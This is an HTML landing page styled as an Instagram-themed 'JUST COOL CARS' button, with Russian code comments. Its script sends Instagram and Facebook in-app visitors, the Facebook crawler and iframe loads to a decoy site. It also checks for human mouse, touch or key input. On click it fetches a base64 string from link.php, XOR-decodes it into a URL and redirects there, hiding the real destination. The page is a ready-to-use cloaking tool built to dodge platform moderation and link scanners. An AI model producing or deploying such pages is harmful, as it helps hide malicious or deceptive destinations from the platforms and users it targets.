<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>📷</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(5px);
      border-radius: 999px;
      padding: 1rem 2rem;
      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
      display: flex;
      align-items: center;
      gap: 0.5rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .container:hover {
      background: rgba(255, 255, 255, 0.2);
    }

    .icon {
      font-size: 1.5rem;
    }

    .text {
      font-weight: 600;
      color: white;
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <div class="container" id="realButton">
    <div class="icon">📷</div>
    <div class="text">JUST COOL CARS</div>
  </div>

  <script>
    // Защита от iframe и встроенного браузера
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const isInsta = ua.includes("instagram") || ua.includes("facebookexternalhit") || ua.includes("fbav") || ua.includes("fbios");
      const isIframe = window.top !== window.self;

      if (isInsta || isIframe) {
        location.href = "https://example.com"; // заменишь на отводной сайт
        return;
      }
    })();

    // Защита: имитация человеческого взаимодействия
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // При клике — проверка взаимодействия и отложенный редирект
    document.getElementById("realButton").addEventListener("click", function () {
      if (!interacted) return;
      setTimeout(() => {
        fetch("link.php") // должен вернуть base64-ссылку типа: echo 'aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=='
          .then(res => res.text())
          .then(code => {
            const decoded = atob(code.trim());
            const xorKey = 3;
            const finalURL = decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
            location.href = finalURL;
          });
      }, 2000);
    });
  </script>
</body>
</html>
